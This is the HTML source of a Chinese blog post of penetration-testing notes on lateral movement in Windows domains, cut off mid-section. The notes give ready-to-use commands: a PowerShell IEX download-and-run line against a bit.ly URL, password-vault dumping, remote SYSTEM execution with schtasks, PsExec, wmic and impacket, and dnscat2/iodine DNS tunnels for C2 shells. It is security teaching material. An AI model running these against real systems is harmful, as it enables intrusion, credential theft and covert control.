@@ -1,0 +1,954 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="johnscott" />
+  
+  
+  
+  <title>63内网渗透 | JohnScott2046的博客</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="网络安全,信息搜集," />
+  
+
+  <script>
+    console.log('\n%c Hexo-theme-bmw v4.0 ' + '%c 🎉 https://github.com/dongyuanxin/theme-bmw 🎉\n' + '\n%c View demo online ' + '%c 🔍 https://godbmw.com/ 🔍  \n' , 'color: #fadfa3; background: #030307; padding:3px 0;', '', 'color: #fadfa3; background: #030307; padding:3px 0;', '');
+  </script>
+
+  
+    <meta name="description" content="超级帽子戏法的个人博客,主要记录复制粘贴过来的笔记,还有自己的一些心得体会">
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  
+<script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+    <link href="https://cdn.bootcss.com/social-share.js/1.0.16/css/share.min.css" rel="stylesheet">
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+  <body>
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">JohnScott2046</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a 
+              href="/"
+              target="_self"
+            >
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a 
+              href="/archives/"
+              target="_self"
+            >
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          
+            <a 
+              href="/categories/"
+              target="_self"
+            >
+              分类
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          
+            <a 
+              href="/tags/"
+              target="_self"
+            >
+              标签
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          
+            <a 
+              href="/friends/"
+              target="_self"
+            >
+              友链
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          
+            <a 
+              href="/about/"
+              target="_self"
+            >
+              关于
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="">
+          
+            <a href="javascript:void(0);" v-else>联系我</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a 
+                    href="https://github.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    Github
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.zhihu.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    知乎
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="http://weibo.com/liuxue5213" 
+                    target="_blank"
+                  >
+                    微博
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="https://www.douban.com/people/liuxue5213" 
+                    target="_blank"
+                  >
+                    豆瓣
+                  </a>
+                </li>
+              
+                <li>
+                  <a 
+                    href="/linkedin.com/in/liuxue5213" 
+                    target="_blank"
+                  >
+                    linkedin
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>63内网渗透</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2022-03-09
+    </span>
+    
+      <span>
+        分类 : 
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+            网络安全
+          </a>
+      </span>
+    
+    
+      <span>
+        浏览 : <span class="article-timer" data-identity="63内网渗透"></span>
+      </span>
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><ol>
+<li><p>渗透测试中三个最根本的横向移动手法：端口漏洞、信息收集、集权设备。</p>
+</li>
+<li><p>横向移动的两个关键点：获取凭据、执行命令</p>
+</li>
+<li><p>扫描常见端口来定位横向移动方向：</p>
+</li>
+</ol>
+<p>常见的Web服务端口如80、443、8080、7001。</p>
+<p>常见的数据库服务端口如1433、1521、3306、6379等。</p>
+<p>系统服务端口如22、445、3389等。</p>
+<ol start="4">
+<li>进行信息收集的途径：</li>
+</ol>
+<p>浏览器书签、历史记录、记住的密码</p>
+<p>运维管理工具xshell、navicat等保存的密码</p>
+<p>磁盘上的包含敏感信息的文件</p>
+<p>社交工具的聊天记录</p>
+<ol start="5">
+<li>常见的集权设备：</li>
+</ol>
+<p>Active Directory域服务</p>
+<p>堡垒机</p>
+<p>vcenter</p>
+<h3 id="AD域基本介绍"><a href="#AD域基本介绍" class="headerlink" title="AD域基本介绍"></a>AD域基本介绍</h3><ol>
+<li><p>域：一个资源对象（PC、服务器、用户、邮箱、打印机、共享文件夹等）的集合。</p>
+</li>
+<li><p>域的作用：身份验证、集权管理。AD域是当前大型企业实现办公内网集权管理的首选方案。</p>
+</li>
+<li><p>常见计算机概念：</p>
+</li>
+</ol>
+<p>独立服务器：安装Windows Server系统后，运行该操作系统的计算机成为独立服务器，其最明显的特征就是没有加入到“域”。</p>
+<p>成员服务器：独立服务器添加到“域”后，成为成员服务器，接受ADDS域服务的统一管理。</p>
+<p>域控制器：域控制器中运行AD DS服务，Windows Server2012中域控制器包括3种类型:额外域控制器、域控制器以及只读控制器。</p>
+<ol start="4">
+<li><p>DNS：域环境中DNS是基石（DNS集成到DC中），网络中的计算机通过DNS定位域控制器。</p>
+</li>
+<li><p>工作组：工作组是一组计算机的集合，其中的每台计算机独自管理。</p>
+</li>
+<li><p>AD和DC：为了方便查找、管理和使用，我们把网络中的资源对象井然有序地方在一个大仓库中，同时做好检索信息，这个大仓库就是活动目录数据库（AD库）。</p>
+</li>
+</ol>
+<p>而存放了AD库的计算机就是域控制器（DC）</p>
+<ol start="7">
+<li><p>用户：计算机中的用户分为本地用户账户和域用户账户。本地账户用于工作组环境或个人环境，域用户账户主要适用于Windows 域环境。</p>
+</li>
+<li><p>用户组：组是计算机账户或其他域对象的集合，在AD DS域服务中的组类型分为安全组(Security Group)和通讯组(Distribution Group)。</p>
+</li>
+<li><p>组策略：组策略是域管理员用来管理企业中计算机的一种方式。它基于域、组织单位，对域、组织单位中的计算机和用户都有效。</p>
+</li>
+<li><p>从工作组环境提升到域环境后，能为企业带来的价值:</p>
+</li>
+</ol>
+<p>提升企业形象。</p>
+<p>安全性能加强、权限更加分明。</p>
+<p>创建和企业行政管理结构类同的架构，管理目标明确，和领导层沟通容易。</p>
+<p>通过管理架构部署组策略，通过策略强制(限制)管理客户端。</p>
+<p>提升用户办公体验</p>
+<h3 id="Powershell-获取-IE-浏览器的账户密码信息"><a href="#Powershell-获取-IE-浏览器的账户密码信息" class="headerlink" title="Powershell 获取 IE 浏览器的账户密码信息"></a>Powershell 获取 IE 浏览器的账户密码信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType&#x3D;WindowsRuntime]</span><br><span class="line">$vault &#x3D; New-Object Windows.Security.Credentials.PasswordVault</span><br><span class="line">$vault.RetrieveAll() | % &#123; $_.RetrievePassword();$_ &#125; | select username,resource,password</span><br></pre></td></tr></table></figure>
+
+<p>示例地址 <a target="_blank" rel="noopener" href="http://bit.ly/2K75g15">http://bit.ly/2K75g15</a></p>
+<p>powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="http://bit.ly/2K75g15&#39;)&quot;">http://bit.ly/2K75g15&#39;)&quot;</a></p>
+<p>这个时候就能获取到IE浏览器中的缓存信息，查找保存的账户和密码信息</p>
+<h3 id="IPC"><a href="#IPC" class="headerlink" title="IPC$"></a>IPC$</h3><p>建立ipc连接以后，就可以访问目标机器的文件（上传、下载），也可以在目标机器 上运行命令。上传和下载文件直接通过 copy 命令就可以，不过路径换成 UNC 路径。何为 UNC 路径？简单来讲以 \ 开头的路径就是 UNC 路径，比如 \192.168.1.1\c$\</p>
+<p>域用户可以连接域里面的所有机子，但是如果域用户不是这个域机子的成员，那么就没有权限访问该域机子的文件</p>
+<p>建立连接<br>net use \192.168.1.21 /u:god\administrator Admin12345</p>
+<p>查看目标开放的共享<br>net view \192.168.1.21</p>
+<p>只有域控才会有下面两个共享目录<br>NETLOGON      Disk          Logon server share<br>SYSVOL        Disk          Logon server share</p>
+<p>删除连接<br>net use \192.168.1.21 /del /y</p>
+<p>dir命令，查看C盘下的文件<br>dir \192.168.1.21\c$</p>
+<p>copy命令<br>本地机器C盘下的1.txt文件 =&gt; 目标桌面<br>copy 1.txt \192.168.1.21\c$\users\administrator\desktop\</p>
+<p>目标机器上的pass.txt  =&gt;  本地机器<br>coyp \192.168.1.21\c$\users\administrator\desktop\pass.txt</p>
+<p>type命令<br>查看目标桌面1.txt文件内容<br>type \192.168.1.21\c$\users\administrator\desktop\1.txt</p>
+<p>把目标的C盘映射到本地<br>把目标C盘映射到本地的x盘，x盘可以随便取名<br>net use x: \192.168.1.21\c$</p>
+<h3 id="计划任务执行命令"><a href="#计划任务执行命令" class="headerlink" title="计划任务执行命令"></a>计划任务执行命令</h3><ol>
+<li><p>执行bat<br>schtasks /create /tn task1 /U 域\域用户 /P 域用户密码 /tr 执行的命令或者bat路径 /sc ONSTART /s 域机器IP /RU system</p>
+</li>
+<li><p>运行<br>schtasks /run /tn task1 /s 域机子IP /U 域\域用户 /P 域用户密码</p>
+</li>
+<li><p>删除计划任务<br>schtasks /F /delete /tn task1 /s 域机子IP /U 域\域用户 /P 域用户密码</p>
+</li>
+</ol>
+<p>/RU system  ：立即执行，以system权限执行</p>
+<p>域用户<br>schtasks /create /tn task1 /U domain\username /P password /tr C:\temp\1.bat /sc /ONSTART /s 192.168.1.1 /RU system<br>schtasks /run /tn task1 /s 192.168.1.1 /U domain\username /P password<br>schtasks /F /delete /tn task1 /s 192.168.1.1 /U domain\username /P password</p>
+<p>本地用户<br>schtasks /create /tn task1 /U a\username /P password /tr C:\temp\1.bat /sc ONSTART /s 192.168.1.1 /RU system<br>schtasks /run /tn task1 /s 192.168.1.1 /U a\username /P password<br>schtasks /F /delete /tn task1 /s 192.168.1.1 /U a\username /P passwords</p>
+<h3 id="schtasks（计划任务）实例"><a href="#schtasks（计划任务）实例" class="headerlink" title="schtasks（计划任务）实例"></a>schtasks（计划任务）实例</h3><p>在本地创建一个bat文件：执行命令输出到目标临时目录1.txt里</p>
+<p>whoami &gt;&gt; c:\windows\temp\1.txt<br>net user &gt;&gt; c:\windows\temp\1.txt<br>systeminfo &gt;&gt; c:\windows\temp\1.txt</p>
+<p>把1.bat拷贝到目标桌面<br>copy 1.bat \192.168.1.21\c$\users\administrator\desktop</p>
+<p>然后创建计划任务并执行</p>
+<p>创建计划任务名为task1<br>schtasks /create /tn task1 /U god\administrator /P Admin12345 /tr C:\users\administrator\desktop\1.bat /sc ONSTART /s 192.168.3.21 /RU system</p>
+<p>执行计划任务task1<br>schtasks /run /tn task1 /s 192.168.3.21 /U god\administrator /P Admin12345</p>
+<p>删除计划任务task1<br>schtasks /F /delete /tn task1 /s 192.168.3.21 /U god\administrator /P Admin12345</p>
+<p>查看目标机器的 c:\windows\temp\1.txt ，就可以看到想要执行的命令<br>type \192.168.1.21\c$\windows\temp\1.txt</p>
+<h3 id="Dnscat2-DNS隧道进行C-amp-C通信"><a href="#Dnscat2-DNS隧道进行C-amp-C通信" class="headerlink" title="Dnscat2-DNS隧道进行C&amp;C通信"></a>Dnscat2-DNS隧道进行C&amp;C通信</h3><p>通过 DNS协议 创建 C&amp;C 隧道，让攻击者更加隐蔽。可以访问任何数据以及上传和下载文件，并且获得一个 shell。</p>
+<p>这个工具是基于53端口的，只要通过53端口就能建立连接，速度会快很多，而且发送的流量都是正常流量。</p>
+<p>但是这些通信流量在数据包日志里就非常明显了，容易被发现</p>
+<h4 id="什么时候用到-DNScat2"><a href="#什么时候用到-DNScat2" class="headerlink" title="什么时候用到 DNScat2"></a>什么时候用到 DNScat2</h4><p>目标只能DNS出网的时候可以用到DNScat2</p>
+<p>下载地址 <a href="https://github.com/iagox86/dnscat2">https://github.com/iagox86/dnscat2</a></p>
+<h4 id="dns-隧道分为两种"><a href="#dns-隧道分为两种" class="headerlink" title="dns 隧道分为两种"></a>dns 隧道分为两种</h4><ol>
+<li>一种是直连模式，就是dns通信目标受害机器直接连接到自己的VPS服务器（C&amp;C）</li>
+</ol>
+<p>攻击者 运行服务，监听53端口<br>目标主机 运行客户端 请求服务</p>
+<ol start="2">
+<li>第二种是中继模式，受害者机器首先会去请求互联网上的dns服务器，最后再指向自己的VPS服务器（C&amp;C）</li>
+</ol>
+<p>攻击者 运行服务，监听53端口<br>目标主机 运行客户端 先请求互联网上的dns服务器 然后再请求服务</p>
+<h4 id="使用流程"><a href="#使用流程" class="headerlink" title="使用流程"></a>使用流程</h4><ol>
+<li>在一台外网VPS服务器上安装Linux操作系统（作为C&amp;C服务器），并提供一个可以配置的域名</li>
+</ol>
+<p>添加一个域名解析</p>
+<p>主机记录 WWW 记录类型A 解析线路默认 记录值为服务器ip </p>
+<p>然后 <code>ping 域名</code>，看到指向到 设置的ip，说明解析记录A已经设置生效</p>
+<p>使用 tcpdump 抓包（端口的53的UDP包）<br>sudo tcpdump -n -i eth0 dst port 53</p>
+<p>然后使用 nslookup 命令查看Dns是否解析成功<br>nslookup test.saulgoodman.club</p>
+<ol start="2">
+<li>安装dnscat2服务端</li>
+</ol>
+<p>在VPS服务器上安装服务端，dnscat2是用ruby语言编写的，所以先配置ruby环境</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gem</span><br><span class="line">sudo apt-get install ruby-dev</span><br><span class="line">sudo apt-get install libpq-dev</span><br><span class="line">sudo apt-get install ruby-bundler</span><br></pre></td></tr></table></figure>
+
+<p>安装dnscat2</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get install git</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;iagox86&#x2F;dnscat2.git</span><br><span class="line">cd dnscat2&#x2F;serive&#x2F;</span><br><span class="line">sudo apt-get install libxml2-dev libxslt-dev</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure>
+
+<p>启动服务端三种方式</p>
+<p>sudo ruby./dnscat2.rb abc.com –secret=krystal<br>sudo ruby./dnscat2.rb –dns server=127.0.0.1,port=533,type=TXT –secret=krystal<br>sudo ruby./dnscat2.rb abc.com –secret=krystal –security=open –no-cache</p>
+<p>ruby ./dnscat2.rb test.saulgoodman.club -e open -c krystal –no-cache<br>-W0 -Ispec 是为了不报错弹出警告，如果报错发出警告可以加上这一条参数<br>-e 是一个安全级别，open是服务端允许客户端不进行加密<br>-c 是指定一个密码<br>–no-cache 禁止缓存，务必在允许服务器时添加此选项，因为powershell-dnscat2客户端与dnscat2服务器的Caching模式不兼容</p>
+<p>如果采用是直连模式，可以用下面这条命令<br>sudo ruby./dnscat2.rb –dns server=127.0.0.1,port=533,type=TXT –secret=krystal</p>
+<ol start="3">
+<li>客户端下载安装dnscat2 </li>
+</ol>
+<p>Windows客户端下载 <a target="_blank" rel="noopener" href="https://downloads.skullsecurity.org/dnscat2">https://downloads.skullsecurity.org/dnscat2</a></p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip%EF%BC%88%E5%AF%86%E7%A0%81%EF%BC%9Apassword">https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip（密码：password</a> ）</p>
+<p>Linux 直接下载并编译</p>
+<p>git clone <a href="https://github.com/iagox86/dnscat2.git">https://github.com/iagox86/dnscat2.git</a><br>cd dnscat2/client<br>make</p>
+<ol start="4">
+<li>测试是否能通信</li>
+</ol>
+<p>服务端建立后，执行如下命令，测试客户端是否能与服务端通信</p>
+<p>./dnscat –dns domain=dns.域名</p>
+<ol start="5">
+<li>反弹Shell</li>
+</ol>
+<p>客户端和服务端建立连接之后，服务端将处于交互模式，输入”windows”或者”session”命令</p>
+<p>可以输入help查看有哪些命令<br>help</p>
+<p>查看当前控制的进程（每个连接都是独立的）<br>session</p>
+<p>输入命令选择进入到目标<br>session -i 1</p>
+<p>获取交互式 shell 模式<br>shell</p>
+<p>dnscat2 还提供了多域名并发的特性，可以将多个子域名绑定在同一个 NS 解析记录下，然后再服务端同时接收多个客户连接</p>
+<p>ruby dnscat2.rb –dns=port=53532 –security=open start –dns domain=域名1,domain=域名2</p>
+<h3 id="iodine进行DNS通信"><a href="#iodine进行DNS通信" class="headerlink" title="iodine进行DNS通信"></a>iodine进行DNS通信</h3><p>iodine可以通过一台 DNS 服务器制造一个 IPv4 数据通道，特别适合在目标主机只能发送 DNS 请求的网络环境使用。</p>
+<p>iodine支持多平台、支持16个并发连接，支持多种DNS记录类型，支持同网段隧道IP地址（不同于服务器一客户端网段）、支持强制密码机制。</p>
+<p>iodine是基于C语言开发的，分别服务端程序 iodined 和客户端程序 iodine，Kali Linux 内置了 iodine。</p>
+<p>iodine支持直接转发和中继模式，其原理是<br>通过TAP虚拟网卡，在服务端建立一个局域网；客户端，通过TAP建立一个虚拟网卡；两者通过 DNS 隧道连接，处于同一局域网（可以通过ping命令通信）</p>
+<p>在客户端和服务端之间建立连接之后，客户段机器上会多出一块名为”dns0”的虚拟网卡</p>
+<p>下载地址 <a target="_blank" rel="noopener" href="http://code.kryo.se/iodine">http://code.kryo.se/iodine</a></p>
+<h4 id="安装服务端"><a href="#安装服务端" class="headerlink" title="安装服务端"></a>安装服务端</h4><p>首先需要设置域名解析（域名越短，隧道的宽带消耗就越小）</p>
+<p>设置A记录 iodine服务的IP地址<br>添加 主机记录test 记录类型A 解析线路默认 记录值为服务器ip;</p>
+<p>将NS记录指向此子域名<br>添加 主机记录vpn 记录类型NS 解析线路默认 记录值为 test.域名;</p>
+<p>安装iodine<br>apt install iodine</p>
+<p>启动服务<br>iodined -f -c -P krystal 192.168.18.1 vpn.域名 -DD</p>
+<p>-f  在前台运行<br>-c  禁止检查所有传入请求的客户端 IP 地址<br>-P  客户端和服务器之间用于验证身份的密码<br>-D  指定调试级别。-DD指的是二级，D的数量随等级增加<br>192.168.18.1  是自定义的局域网虚拟 IP 地址</p>
+<p>最后通过 <a target="_blank" rel="noopener" href="https://code.kryo.se/iodine/check-it">https://code.kryo.se/iodine/check-it</a> 网站检查 iodine 是否配置成功</p>
+<p>显示 Well done, your iodine setup seems fine!  说明配置完成</p>
+<h4 id="安装客户端"><a href="#安装客户端" class="headerlink" title="安装客户端"></a>安装客户端</h4><p>iodine -f -P krystal vpn.域名 -M 200</p>
+<p>-r  iodine有时候会自动将DNS隧道切换为UDP通道，该参数的作用是强制在任何情况下使用DNS隧道<br>-M  指定上行主机名的大小<br>-m  调节最大下行分片的大小<br>-T  指定所使用的DNS请求的类型，可选项有NULL,PRIVATE,TXT,SRV,CHAME,MX,A<br>-O  指定数据编码<br>-L  指定是否开启懒惰模式（默认开启）<br>-I  指定请求与请求之间的时间间隔</p>
+<p>然后查看网络信息 ifconfig</p>
+<p>会看到额外多一个网卡</p>
+<p>这样客户端和服务端就相当于在同一个局域网，我们就可以通过SSH登录服务端，反过来服务端也可以通过SSH登录服务端</p>
+<p>ssh 192.168.18.1</p>
+<h4 id="Windows客户端"><a href="#Windows客户端" class="headerlink" title="Windows客户端"></a>Windows客户端</h4><p>windows客户端可以直接使用编译好的windows版本，需要安装TAP网卡驱动程序。也可以下载OpenVPN，在安装时仅选择TAP-Win32驱动程序</p>
+<p>运行客户端程序iodine(cmd已管理员权限运行)，如果出现提示”Connection setup complete, transmitting data”，就表示DNS隧道已经建立</p>
+<p>iodine.exe -f -P krystal vpn.域名</p>
+<h3 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h3><p>PsExec主要用于大批量 Windows 主机的维护，更适合域环境</p>
+<p>PsExec包含在PsTools工具包中，使用PsExec通过命令行环境与目标机器建立连接，可以控制目标机器，而不需要通过远程桌面（RDP）进行图形化的控制；也可以执行命令，将管理员权限提升到 System 权限以运行指定的程序</p>
+<p>下载地址 <a target="_blank" rel="noopener" href="https://download.sysinternals.com/files/PSTools.zip">https://download.sysinternals.com/files/PSTools.zip</a></p>
+<h4 id="PsExec的基本原理"><a href="#PsExec的基本原理" class="headerlink" title="PsExec的基本原理"></a>PsExec的基本原理</h4><p>通过管道在远程目标主机上创建一个服务，并在本地磁盘中生成一个”PSEXESVC”的二进制文件，然后通过服务运行命令，运行结束后删除服务</p>
+<h4 id="PsExec的使用"><a href="#PsExec的使用" class="headerlink" title="PsExec的使用"></a>PsExec的使用</h4><ol>
+<li>获取目标操作系统的交互式Shell</li>
+</ol>
+<p>net use \192.168.1.21 /u:域名\administrator Admin12345</p>
+<p>执行如下命令，获取 System 权限的 Shell</p>
+<p>PsExec.exe -accepteula \192.168.1.21 -s cmd.exe<br>-accepteula 第一次运行PsExec会弹出确认框，使用该参数就不会弹出确认框<br>-s 以System权限运行远程进程，获得一个System权限的交互式Shell，如果不用这个参数，那么会获得一个administrator权限的shell</p>
+<p>获得一个 administrator 权限的 shell<br>PsExec.exe -accepteula \192.168.1.21 cmd.exe</p>
+<p>如果没有建立 ipc$，PsExec 有两个参数可以通过指定的账号和密码进行远程连接<br>PsExec.exe \192.168.1.21 -u 域名\administrator -p Admin12345 cmd.exe<br>-u  域\用户名<br>-p  密码</p>
+<p>使用 PsExec 在远程计算机上执行命令进行回显<br>PsExec.exe \192.168.1.21 -u 域名\administrator -p Admin12345 cmd /c “ipconfig”</p>
+<h4 id="PsExec的注意事项"><a href="#PsExec的注意事项" class="headerlink" title="PsExec的注意事项"></a>PsExec的注意事项</h4><p>需要远程系统开启admin$共享（默认是开启的），原理是基于IPC$共享，目标需要开放445端口和admin$共享</p>
+<p>使用IPC连接目标系统后，不需要输入账户和密码。</p>
+<p>使用PsExec执行远程命令时，会在目标系统中创建一个psexec的服务。命令执行完后，psexec服务将被自动删除。由于创建或删除服务时会产生大量的日志，可以在攻击溯源时通过日志反推攻击流程。</p>
+<p>使用PsExec可以直接获得System权限的交互式Shell（前提目标是administrator权限的shell）</p>
+<p>在域环境测试时发现，非域用户无法利用内存中的票据使用PsExec功能，只能依靠账号和密码进行传递</p>
+<h4 id="Metasploit-使用-PsExec-模块"><a href="#Metasploit-使用-PsExec-模块" class="headerlink" title="Metasploit 使用 PsExec 模块"></a>Metasploit 使用 PsExec 模块</h4><p>search psexec</p>
+<p>exploit/windows/smb/psexec<br>exploit/windows/smb/psexec_psh  (Powershell版本的psexec)</p>
+<p>use exploit/windows/smb/psexec<br>set rhosts 192.168.1.230<br>set smbuser administrator<br>set smbpass Admin12345<br>run</p>
+<p>psexec_psh模块和psexec模块的使用方法相同，区别在于通过 psexec_psh 模块上传的 payload 是 powershell 版本的</p>
+<h3 id="wmic"><a href="#wmic" class="headerlink" title="wmic"></a>wmic</h3><p>通过渗透测试发现，在使用 wmiexec 进行横向移动时，windows操作系统默认不会将 WMI 的操作记录在日志中。因此很多 APT 开始使用 WMI 进行攻击</p>
+<p>使用目标系统的 cmd.exe 执行一条命令，并将结果保存在 C 盘的 ip.txt 文件中</p>
+<p>wmic /node:192.168.1.21 /user:域名\Administrator /password:Admin12345 process call create “cmd.exe /c ipconfig &gt;c:\ip.txt”</p>
+<p>我们可以通过建立 IPC$（2008域用户–&gt;2008域管），使用 type 命令读取执行结果</p>
+<p>建立IPC$<br>net use \192.168.1.21 /u:域名\administrator Admin12345</p>
+<p>type读取结果<br>type \192.168.1.21\c$\ip.txt</p>
+<p>使用 wmic 远程执行命令，在远程系统中启动 Windows Mannagement Instrumentation 服务（目标服务器需要开放 135 端口，wmic 会以管理员权限在远程系统中执行命令）</p>
+<p>如果目标服务器开启了防火墙，wmic 将无法进行连接。此外 wmic 命令没有回显，需要使用 ipc$ 和 type 命令来读取信息</p>
+<h4 id="impacket工具包的wmiexec"><a href="#impacket工具包的wmiexec" class="headerlink" title="impacket工具包的wmiexec"></a>impacket工具包的wmiexec</h4><p>github地址 <a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
+<p>进入impacket目录安装依赖</p>
+<p>pip install .</p>
+<p>进入到 examples 目录运行脚本获取远程目标系统的shell</p>
+<p>python wmiexec.py Administrator:<a href="mailto:&#65;&#100;&#109;&#x69;&#110;&#x31;&#50;&#51;&#52;&#x35;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#49;&#46;&#50;&#51;&#x30;">&#65;&#100;&#109;&#x69;&#110;&#x31;&#50;&#51;&#52;&#x35;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#49;&#46;&#50;&#51;&#x30;</a></p>
+<h4 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h4><p>wmiexec.vbs 可以在远程系统中执行命令并进行回显，获得远程主机的半交互式shell</p>
+<p>cscript.exe //nologo wmiexec.vbs /shell 192.168.1.21 administrator Admin12345</p>
+<p>输入如下命令，使用 wmiexec.vbs 在远程主机上执行单挑命令</p>
+<p>cscript.exe wmiexec.vbs /cmd 192.168.1.21 administrator Admin12345 “ipconfig”</p>
+<p>对于一些运行时间比较长的命令，例如 ping、systeminfo，需要添加一个参数：“-wait 5000”，或者更长的时间间隔。</p>
+<p>PS：wmiexec.vbs 已经被卡巴斯基，赛门铁克 等杀毒软件列入黑名单了</p>
+<h4 id="Invoke-WMIMethod"><a href="#Invoke-WMIMethod" class="headerlink" title="Invoke-WMIMethod"></a>Invoke-WMIMethod</h4><p>利用 PowerShell 自带的 Invoke-WMIMethod，可以在远程系统主机上执行命令和指定程序</p>
+<p>目标系统用户名<br>$User = “域名\administrator”</p>
+<p>目标系统密码<br>$Password= ConvertTo-SecureString -String “Admin12345” -AsPlainText -Force</p>
+<p>账号密码整合，导入Credential<br>$Cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User , $Password</p>
+<p>远程运行计算器程序<br>Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList “calc.exe” -ComputerName “192.168.1.21” -Credential $Cred</p>
+<p>远程目标域控机器上就会有一个 calc.exe 的进程</p>
+<h3 id="smbexec"><a href="#smbexec" class="headerlink" title="smbexec"></a>smbexec</h3><p>smbexec 可以通过文件共享（admin$，c$，ipc$，d$）在远程系统中执行命令</p>
+<h4 id="impacket-工具包中的-smbexec-py"><a href="#impacket-工具包中的-smbexec-py" class="headerlink" title="impacket 工具包中的 smbexec.py"></a>impacket 工具包中的 smbexec.py</h4><p>下载地址 <a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
+<p>远程执行目标系统命令</p>
+<p>smbexec.py 域名.org/administrator:Admin12345@192.168.1.230</p>
+<h4 id="Linux-跨平台-Windows-远程命令执行"><a href="#Linux-跨平台-Windows-远程命令执行" class="headerlink" title="Linux 跨平台 Windows 远程命令执行"></a>Linux 跨平台 Windows 远程命令执行</h4><p>工具包下载地址 <a href="https://github.com/brav0hax/smbexec.git">https://github.com/brav0hax/smbexec.git</a></p>
+<p>下载安装运行脚本</p>
